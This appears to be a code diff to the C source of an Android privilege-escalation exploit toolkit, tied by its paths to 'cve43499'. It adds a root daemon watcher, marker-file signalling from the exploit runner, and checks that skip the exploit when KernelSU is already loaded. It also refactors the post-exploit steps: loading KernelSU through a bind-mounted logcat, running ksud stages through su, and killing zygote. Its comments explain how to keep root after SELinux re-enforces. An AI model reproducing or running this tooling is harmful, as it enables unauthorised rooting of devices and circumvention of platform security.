@@ -415,6 +415,177 @@ struct ksu_get_info_cmd {
   uint32_t uapi_version;
 };
 
+/*
+ * Pre-exploit KernelSU liveness probe. KernelSU hooks sys_reboot with the
+ * 0xDEADBEEF/0xCAFEBABE magic pair and hands back an fd to its control
+ * device. Without the module loaded the kernel rejects the unknown reboot
+ * magic with EINVAL and never reboots, so the probe is safe on stock
+ * kernels. Returns 1 when the module is already responding, 0 otherwise.
+ */
+static int ksu_already_active(void) {
+  int fd = -1;
+  syscall(SYS_reboot, 0xDEADBEEF, 0xCAFEBABE, 0, &fd);
+  if (fd < 0) {
+    return 0;
+  }
+  struct ksu_get_info_cmd info;
+  memset(&info, 0, sizeof(info));
+  int ret = ioctl(fd, _IOR('K', 2, struct ksu_get_info_cmd), &info);
+  close(fd);
+  return ret == 0 && info.version != 0;
+}
+
+/*
+ * Activation handoff marker. The exploit side (runner or preload
+ * supervisor) drops this file once root is installed; the daemon's
+ * activation watcher polls for it and performs KernelSU late-load + module
+ * activation from its own root context, because shell-domain clients lose
+ * daemon-socket access once SELinux re-enforces.
+ */
+#define KSU_ACTIVATE_SIGNAL_PATH "/data/local/tmp/.cve43499-activate"
+
+static void ksu_signal_activation(void) {
+  unlink(KSU_ACTIVATE_SIGNAL_PATH);
+  int fd = open(KSU_ACTIVATE_SIGNAL_PATH, O_WRONLY | O_CREAT | O_EXCL, 0644);
+  if (fd >= 0) {
+    close(fd);
+  }
+}
+
+/*
+ * Boot-scoped active marker. After a successful activation the daemon
+ * writes the current boot_id here; the pre-exploit check compares it
+ * against the live boot_id to detect that KernelSU was already activated
+ * this boot even when shell has no KSU root grant yet.
+ */
+#define KSU_ACTIVE_MARKER_PATH "/data/local/tmp/.cve43499-ksu-active"
+
+static int read_boot_id(char *out, size_t out_len) {
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t got = read(fd, out, out_len - 1);
+  close(fd);
+  if (got <= 0) {
+    return 0;
+  }
+  out[got] = '\0';
+  while (got > 0 && (out[got - 1] == '\n' || out[got - 1] == '\r')) {
+    out[--got] = '\0';
+  }
+  return got > 0;
+}
+
+static int ksu_active_this_boot(void) {
+  char live_boot_id[64];
+  char marker_boot_id[64];
+  if (!read_boot_id(live_boot_id, sizeof(live_boot_id))) {
+    return 0;
+  }
+  int fd = open(KSU_ACTIVE_MARKER_PATH, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t got = read(fd, marker_boot_id, sizeof(marker_boot_id) - 1);
+  close(fd);
+  if (got <= 0) {
+    return 0;
+  }
+  marker_boot_id[got] = '\0';
+  while (got > 0 &&
+         (marker_boot_id[got - 1] == '\n' || marker_boot_id[got - 1] == '\r')) {
+    marker_boot_id[--got] = '\0';
+  }
+  return strcmp(live_boot_id, marker_boot_id) == 0;
+}
+
+static void ksu_mark_active_this_boot(void) {
+  char live_boot_id[64];
+  if (!read_boot_id(live_boot_id, sizeof(live_boot_id))) {
+    return;
+  }
+  int fd = open(KSU_ACTIVE_MARKER_PATH,
+                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
+  if (fd < 0) {
+    return;
+  }
+  ssize_t ignored = write(fd, live_boot_id, strlen(live_boot_id));
+  (void)ignored;
+  close(fd);
+}
+
+/*
+ * Pre-exploit KernelSU detection via `su -c id`. Works from adb shell when
+ * KernelSU is loaded and shell (uid 2000) has a root grant in the manager.
+ * Bounded by a ~5s timeout so a grant dialog or a missing binary cannot
+ * stall the run. Returns 1 when su reports uid=0.
+ */
+static int su_probe_active(void) {
+  int pipefd[2];
+  if (pipe2(pipefd, O_CLOEXEC) != 0) {
+    return 0;
+  }
+  pid_t child = fork();
+  if (child < 0) {
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return 0;
+  }
+  if (child == 0) {
+    dup2(pipefd[1], STDOUT_FILENO);
+    int devnull = open("/dev/null", O_WRONLY);
+    if (devnull >= 0) {
+      dup2(devnull, STDERR_FILENO);
+      close(devnull);
+    }
+    execl("/system/bin/su", "su", "-c", "id", (char *)NULL);
+    _exit(127);
+  }
+  close(pipefd[1]);
+
+  char buf[128];
+  size_t total = 0;
+  buf[0] = '\0';
+  for (int waited_ms = 0; waited_ms < 5000 && total + 1 < sizeof(buf);
+       waited_ms += 100) {
+    struct pollfd pfd = {.fd = pipefd[0], .events = POLLIN};
+    int pr = poll(&pfd, 1, 100);
+    if (pr <= 0) {
+      continue;
+    }
+    ssize_t got = read(pipefd[0], buf + total, sizeof(buf) - 1 - total);
+    if (got <= 0) {
+      break;
+    }
+    total += (size_t)got;
+    buf[total] = '\0';
+    if (strstr(buf, "uid=") != NULL) {
+      break;
+    }
+  }
+
+  int status = 0;
+  int timed_out = 0;
+  pid_t waited = waitpid(child, &status, WNOHANG);
+  if (waited == 0) {
+    usleep(200000);
+    waited = waitpid(child, &status, WNOHANG);
+    if (waited == 0) {
+      kill(child, SIGKILL);
+      do {
+        waited = waitpid(child, &status, 0);
+      } while (waited < 0 && errno == EINTR);
+      timed_out = 1;
+    }
+  }
+  close(pipefd[0]);
+  if (timed_out) {
+    return 0;
+  }
+  return strncmp(buf, "uid=0", 5) == 0;
+}
+
 static int verify_kernelsu_control(void) {
   int fd = -1;
   syscall(SYS_reboot, 0xDEADBEEF, 0xCAFEBABE, 0, &fd);
@@ -444,6 +615,153 @@ static int verify_kernelsu_control(void) {
   return 0;
 }
 
+/*
+ * Core KernelSU late-load work. Runs in the calling (already-forked)
+ * process so it can be shared between the socket-request path and the
+ * daemon-side activation watcher. Returns the loader/verify exit status.
+ */
+static int kernelsu_late_load_core(void) {
+  if (unshare(CLONE_NEWNS) != 0 ||
+      mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0) {
+    dprintf(STDERR_FILENO, "late-load: private mount namespace: %s\n",
+            strerror(errno));
+    return 10;
+  }
+  if (mount(KSU_LOADER_PATH, LOGCAT_PATH, NULL, MS_BIND, NULL) != 0) {
+    dprintf(STDERR_FILENO, "late-load: bind mount: %s\n", strerror(errno));
+    return 11;
+  }
+
+  pid_t loader = fork();
+  if (loader < 0) {
+    dprintf(STDERR_FILENO, "late-load: fork: %s\n", strerror(errno));
+    return 12;
+  }
+  if (loader == 0) {
+    /* Let the downloaded target-specific ksud select its embedded module
+     * from the running kernel.  Hard-coding android15-6.6 made the shared
+     * loader path unusable for exact 6.1 payloads such as E2S. */
+    execl(LOGCAT_PATH, "logcat", "late-load", "--package-name",
+          "me.weishu.kernelsu", (char *)NULL);
+    dprintf(STDERR_FILENO, "late-load: exec: %s\n", strerror(errno));
+    _exit(12);
+  }
+
+  int loader_status = wait_status(loader);
+  if (loader_status != 0) {
+    return loader_status;
+  }
+  return verify_kernelsu_control();
+}
+
+/*
+ * Core module-activation work. Runs in the calling (already-forked)
+ * process. Activates KernelSU modules via the ksud lifecycle stages, then
+ * restarts zygote so the fresh zygote picks up Zygisk/LSPosed modules.
+ *
+ * The daemon itself lives in u:r:kernel:s0, which SELinux denies access to
+ * /data/adb (magisk_file) and to signaling the zygote — that is why the
+ * old direct-exec path reported "no ksud binary found" and modules stayed
+ * disabled. Everything is therefore executed through /system/bin/su, which
+ * transitions into the u:r:ksu:s0 domain where /data/adb, module scripts,
+ * sepolicy patching and zygote signals are all permitted (uid 0 is always
+ * allowed by KernelSU sucompat, no manager grant needed).
+ */
+static const char APPLY_MODULES_SU_SCRIPT[] =
+    "ksud=''; "
+    "for p in /data/adb/ksud /data/adb/ksu/bin/ksud "
+    "/data/local/tmp/ksud-s25u-kdp; do "
+    "[ -x \"$p\" ] && ksud=\"$p\" && break; "
+    "done; "
+    "if [ -z \"$ksud\" ]; then "
+    "echo 'apply-modules: no ksud binary found' >&2; exit 1; "
+    "fi; "
+    "for s in post-fs-data services boot-completed; do "
+    "\"$ksud\" \"$s\" >/dev/null 2>&1; "
+    "echo \"apply-modules: ksud $s exit=$? ($ksud)\"; "
+    "done; "
+    "for p in $(pidof zygote64) $(pidof zygote); do "
+    "kill -9 $p 2>/dev/null; "
+    "done; "
+    "echo 'apply-modules: zygote restart triggered'";
+
+static int apply_modules_core(void) {
+  set_root_env();
+
+  /* Preferred path: run the whole lifecycle through su (ksu domain). */
+  pid_t mp = fork();
+  if (mp == 0) {
+    execl("/system/bin/su", "su", "-c", APPLY_MODULES_SU_SCRIPT,
+          (char *)NULL);
+    _exit(127);
+  }
+  int su_status = (mp > 0) ? wait_status(mp) : 1;
+  dprintf(STDOUT_FILENO, "apply-modules: su script exit=%d\n", su_status);
+  if (su_status == 0) {
+    return 0;
+  }
+
+  /* Fallback: direct exec from this domain. Only works when SELinux is
+   * still permissive or the ksud sepolicy patch was already applied this
+   * boot (e.g. re-activation after a soft reboot). */
+  dprintf(STDERR_FILENO,
+          "apply-modules: su path failed (%d); trying direct exec\n",
+          su_status);
+  const char *ksud_paths[] = {
+      "/data/adb/ksud",
+      "/data/local/tmp/ksud-s25u-kdp",
+      "/data/adb/ksu/bin/ksud",
+      NULL,
+  };
+  const char *ksud = NULL;
+  for (int i = 0; ksud_paths[i]; i++) {
+    if (access(ksud_paths[i], X_OK) == 0) {
+      ksud = ksud_paths[i];
+      break;
+    }
+  }
+  if (ksud) {
+    const char *stages[] = {"post-fs-data", "services", "boot-completed",
+                            NULL};
+    for (int i = 0; stages[i]; i++) {
+      pid_t sp = fork();
+      if (sp == 0) {
+        execl(ksud, "ksud", stages[i], (char *)NULL);
+        _exit(127);
+      }
+      int st = (sp > 0) ? wait_status(sp) : 1;
+      dprintf(STDOUT_FILENO, "apply-modules: ksud %s exit=%d (%s)\n",
+              stages[i], st, ksud);
+    }
+  } else {
+    dprintf(STDERR_FILENO, "apply-modules: no ksud binary found\n");
+  }
+
+  pid_t kp = fork();
+  if (kp == 0) {
+    execl(SH_PATH, "sh", "-c",
+          "for p in $(pidof zygote64) $(pidof zygote); do kill -9 $p 2>/dev/null; done; echo zygote-killed",
+          (char *)NULL);
+    _exit(127);
+  }
+  int kill_status = (kp > 0) ? wait_status(kp) : 1;
+  if (kill_status == 0) {
+    dprintf(STDOUT_FILENO, "apply-modules: zygote restart triggered\n");
+  } else {
+    dprintf(STDERR_FILENO,
+            "apply-modules: kill failed, trying setprop ctl.restart\n");
+    pid_t sp = fork();
+    if (sp == 0) {
+      execl(SH_PATH, "sh", "-c",
+            "setprop ctl.restart zygote; setprop ctl.restart zygote_secondary",
+            (char *)NULL);
+      _exit(127);
+    }
+    if (sp > 0) wait_status(sp);
+  }
+  return 0;
+}
+
 static int run_apply_modules(struct su_request *request, int conn) {
   pid_t pid = fork();
   if (pid < 0) {
@@ -458,68 +776,7 @@ static int run_apply_modules(struct su_request *request, int conn) {
     }
     close(conn);
     close_request_fds(request);
-    set_root_env();
-
-    /* 1. Activate KernelSU modules. This ksud build has no `module mount`
-     * subcommand — the lifecycle command that performs the bind/overlay
-     * mounts is `post-fs-data`. Run it as root (we are the daemon). */
-    const char *ksud_paths[] = {
-        "/data/adb/ksud",
-        "/data/local/tmp/ksud-s25u-kdp",
-        "/data/adb/ksu/bin/ksud",
-        NULL,
-    };
-    const char *ksud = NULL;
-    for (int i = 0; ksud_paths[i]; i++) {
-      if (access(ksud_paths[i], X_OK) == 0) {
-        ksud = ksud_paths[i];
-        break;
-      }
-    }
-    if (ksud) {
-      const char *stages[] = {"post-fs-data", "services", "boot-completed",
-                              NULL};
-      for (int i = 0; stages[i]; i++) {
-        pid_t mp = fork();
-        if (mp == 0) {
-          execl(ksud, "ksud", stages[i], (char *)NULL);
-          _exit(127);
-        }
-        int st = (mp > 0) ? wait_status(mp) : 1;
-        dprintf(STDOUT_FILENO, "apply-modules: ksud %s exit=%d (%s)\n",
-                stages[i], st, ksud);
-      }
-    } else {
-      dprintf(STDERR_FILENO, "apply-modules: no ksud binary found\n");
-    }
-
-    /* 2. Kill zygote PIDs directly — init auto-restarts them, and the fresh
-     * zygote picks up Zygisk modules. More reliable than setprop ctl.*
-     * (SELinux-denied from most domains) or ksud soft-reboot. */
-    pid_t kp = fork();
-    if (kp == 0) {
-      execl(SH_PATH, "sh", "-c",
-            "for p in $(pidof zygote64) $(pidof zygote); do kill -9 $p 2>/dev/null; done; echo zygote-killed",
-            (char *)NULL);
-      _exit(127);
-    }
-    int kill_status = (kp > 0) ? wait_status(kp) : 1;
-    if (kill_status == 0) {
-      dprintf(STDOUT_FILENO, "apply-modules: zygote restart triggered\n");
-    } else {
-      /* Fallback: setprop ctl.restart (works from kernel domain on some builds) */
-      dprintf(STDERR_FILENO,
-              "apply-modules: kill failed, trying setprop ctl.restart\n");
-      pid_t sp = fork();
-      if (sp == 0) {
-        execl(SH_PATH, "sh", "-c",
-              "setprop ctl.restart zygote; setprop ctl.restart zygote_secondary",
-              (char *)NULL);
-        _exit(127);
-      }
-      if (sp > 0) wait_status(sp);
-    }
-    _exit(0);
+    _exit(apply_modules_core());
   }
   close_request_fds(request);
   return wait_status(pid);
@@ -539,41 +796,93 @@ static int run_kernelsu_late_load(struct su_request *request, int conn) {
     }
     close(conn);
     close_request_fds(request);
-
-    if (unshare(CLONE_NEWNS) != 0 ||
-        mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0) {
-      dprintf(STDERR_FILENO, "late-load: private mount namespace: %s\n",
-              strerror(errno));
-      _exit(10);
-    }
-    if (mount(KSU_LOADER_PATH, LOGCAT_PATH, NULL, MS_BIND, NULL) != 0) {
-      dprintf(STDERR_FILENO, "late-load: bind mount: %s\n", strerror(errno));
-      _exit(11);
-    }
-
-    pid_t loader = fork();
-    if (loader < 0) {
-      dprintf(STDERR_FILENO, "late-load: fork: %s\n", strerror(errno));
-      _exit(12);
-    }
-    if (loader == 0) {
-      /* Let the downloaded target-specific ksud select its embedded module
-       * from the running kernel.  Hard-coding android15-6.6 made the shared
-       * loader path unusable for exact 6.1 payloads such as E2S. */
-      execl(LOGCAT_PATH, "logcat", "late-load", "--package-name",
-            "me.weishu.kernelsu", (char *)NULL);
-      dprintf(STDERR_FILENO, "late-load: exec: %s\n", strerror(errno));
-      _exit(12);
-    }
-
-    int loader_status = wait_status(loader);
-    if (loader_status != 0) {
-      _exit(loader_status);
-    }
-    _exit(verify_kernelsu_control());
+    _exit(kernelsu_late_load_core());
   }
   close_request_fds(request);
   return wait_status(pid);
+}
+
+/*
+ * Daemon-side activation watcher.
+ *
+ * The exploit runner (shell domain, uid 2000) loses the ability to reach the
+ * daemon socket once SELinux re-enforces, so its --late-load/--apply-modules
+ * socket requests die with "Permission denied" and modules stay disabled.
+ * The daemon, however, was spawned by UMH while SELinux was still permissive
+ * and keeps a usable root security domain. The runner drops a marker file
+ * (ksu_signal_activation) after a successful exploit; this watcher polls for
+ * it and performs late-load + module activation from the daemon's own
+ * context, which is always reachable. Output goes to a dedicated log so the
+ * sequence is inspectable.
+ */
+#define ACTIVATE_LOG_PATH "/data/local/tmp/ksu-activate.log"
+
+static void run_activation_sequence(void) {
+  int log_fd = open(ACTIVATE_LOG_PATH,
+                    O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0600);
+  if (log_fd >= 0) {
+    dup2(log_fd, STDOUT_FILENO);
+    dup2(log_fd, STDERR_FILENO);
+    if (log_fd > STDERR_FILENO) {
+      close(log_fd);
+    }
+  }
+
+  dprintf(STDOUT_FILENO,
+          "[activate] start uid=%d pid=%d ksu_active=%d\n",
+          getuid(), getpid(), ksu_already_active());
+
+  int ll_status = 1;
+  if (!ksu_already_active()) {
+    pid_t ll = fork();
+    if (ll == 0) {
+      _exit(kernelsu_late_load_core());
+    }
+    ll_status = (ll > 0) ? wait_status(ll) : 1;
+    dprintf(STDOUT_FILENO, "[activate] late-load exit=%d\n", ll_status);
+  } else {
+    dprintf(STDOUT_FILENO, "[activate] KernelSU already active, skip late-load\n");
+    ll_status = 0;
+  }
+
+  if (ll_status == 0) {
+    /* Record that KernelSU is active for this boot so future pre-exploit
+     * checks can detect it without needing a shell root grant. */
+    ksu_mark_active_this_boot();
+
+    pid_t am = fork();
+    if (am == 0) {
+      _exit(apply_modules_core());
+    }
+    int am_status = (am > 0) ? wait_status(am) : 1;
+    dprintf(STDOUT_FILENO, "[activate] apply-modules exit=%d\n", am_status);
+  } else {
+    dprintf(STDERR_FILENO,
+            "[activate] late-load failed (%d); skipping module activation\n",
+            ll_status);
+  }
+  dprintf(STDOUT_FILENO, "[activate] done\n");
+}
+
+static void activation_watcher(void) {
+  prctl(PR_SET_NAME, "cve43499-activate", 0, 0, 0);
+  for (;;) {
+    /* Claim the marker atomically: rename succeeds for exactly one watcher
+     * even if a stale daemon from a previous run is still polling. */
+    static const char claimed_path[] = KSU_ACTIVATE_SIGNAL_PATH ".claimed";
+    if (rename(KSU_ACTIVATE_SIGNAL_PATH, claimed_path) == 0) {
+      unlink(claimed_path);
+      pid_t ap = fork();
+      if (ap == 0) {
+        run_activation_sequence();
+        _exit(0);
+      }
+      if (ap > 0) {
+        wait_status(ap);
+      }
+    }
+    sleep(1);
+  }
 }
 
 static void send_response(int conn, int status) {
@@ -958,6 +1267,18 @@ static int daemon_main(void) {
   }
   chmod(BOOTSTRAP_SOCK_PATH, 0666);
 
+  /* Spawn the activation watcher: it polls for the runner's activation
+   * marker and performs KernelSU late-load + module activation from this
+   * daemon's root context (the runner's socket path becomes unreachable
+   * once SELinux re-enforces). */
+  pid_t watcher = fork();
+  if (watcher == 0) {
+    close(fd);
+    setsid();
+    activation_watcher();
+    _exit(0);
+  }
+
   for (;;) {
     int conn = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
     if (conn < 0 && errno == EINTR) {
@@ -1124,6 +1445,27 @@ static int payload_runner_main(int argc, char **argv) {
     return errno;
   }
 
+  /* Pre-exploit KernelSU liveness check. If KernelSU is already active this
+   * boot (a previous run already rooted and late-loaded), skip the exploit
+   * entirely — re-running it only risks a kernel panic for no gain.
+   *
+   * Detection uses two unprivileged signals:
+   *   1. `su -c id` reports uid=0 (works when shell has a KSU root grant);
+   *   2. the boot-scoped active marker matches the live boot_id (works even
+   *      when shell has no grant yet).
+   * The reboot-syscall probe needs CAP_SYS_BOOT and returns EPERM from the
+   * shell domain even when the module is loaded, so it is not used here. */
+  if (su_probe_active() || ksu_active_this_boot()) {
+    dprintf(transport_fd,
+            "[runner] KernelSU already active this boot; skipping exploit\n");
+    close(transport_fd);
+    return 0;
+  }
+  dprintf(transport_fd,
+          "[runner] KernelSU not active; proceeding with exploit\n"
+          "[runner] NOTE: grant shell (uid 2000) root in the KernelSU "
+          "manager after this run so future runs can detect and reuse it\n");
+
   int log_fd = open(argv[4], O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
   if (log_fd < 0 || dup2(log_fd, STDOUT_FILENO) < 0 ||
       dup2(log_fd, STDERR_FILENO) < 0) {
@@ -1164,37 +1506,38 @@ static int payload_runner_main(int argc, char **argv) {
       close(transport_fd);
       return saved_errno;
     }
-    /* Exploit succeeded. SELinux is still permissive right now — trigger
-     * KernelSU late-load + module activation immediately, before the window
-     * closes. The supervisor is uid 2000 (allowed daemon client). */
+    /* Exploit succeeded. The payload constructor already dropped the
+     * activation marker; the root daemon's watcher performs KernelSU
+     * late-load + module activation from its own context. This supervisor
+     * (shell domain) cannot reliably reach the daemon socket once SELinux
+     * re-enforces, so it only waits for the daemon's activation log and
+     * reports the outcome. */
     if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
-      char helper_path[PATH_MAX];
-      if (realpath(argv[3], helper_path)) {
-        dprintf(transport_fd, "[runner] exploit ok, triggering late-load\n");
-        pid_t ll = fork();
-        if (ll == 0) {
-          execl(helper_path, helper_path, "--late-load", (char *)NULL);
-          _exit(127);
-        }
-        int ll_status = 0;
-        while (waitpid(ll, &ll_status, 0) < 0 && errno == EINTR) {
-        }
-        dprintf(transport_fd, "[runner] late-load exit=%d\n",
-                WIFEXITED(ll_status) ? WEXITSTATUS(ll_status) : -1);
-        if (WIFEXITED(ll_status) && WEXITSTATUS(ll_status) == 0) {
-          dprintf(transport_fd, "[runner] triggering apply-modules\n");
-          pid_t am = fork();
-          if (am == 0) {
-            execl(helper_path, helper_path, "--apply-modules", (char *)NULL);
-            _exit(127);
+      dprintf(transport_fd,
+              "[runner] exploit ok, waiting for daemon activation\n");
+      ksu_signal_activation();
+      int activated = 0;
+      for (int i = 0; i < 120; i++) {
+        int marker_fd = open(ACTIVATE_LOG_PATH, O_RDONLY | O_CLOEXEC);
+        if (marker_fd >= 0) {
+          char tail[256];
+          off_t end = lseek(marker_fd, 0, SEEK_END);
+          off_t start = end > (off_t)sizeof(tail) ? end - (off_t)sizeof(tail) : 0;
+          lseek(marker_fd, start, SEEK_SET);
+          ssize_t got = read(marker_fd, tail, sizeof(tail) - 1);
+          close(marker_fd);
+          if (got > 0) {
+            tail[got] = '\0';
+            if (strstr(tail, "[activate] done")) {
+              activated = 1;
+              break;
+            }
           }
-          int am_status = 0;
-          while (waitpid(am, &am_status, 0) < 0 && errno == EINTR) {
-          }
-          dprintf(transport_fd, "[runner] apply-modules exit=%d\n",
-                  WIFEXITED(am_status) ? WEXITSTATUS(am_status) : -1);
         }
+        sleep(1);
       }
+      dprintf(transport_fd, "[runner] daemon activation %s\n",
+              activated ? "completed" : "timed out (check " ACTIVATE_LOG_PATH ")");
     }
     close(transport_fd);
     if (WIFEXITED(status)) {
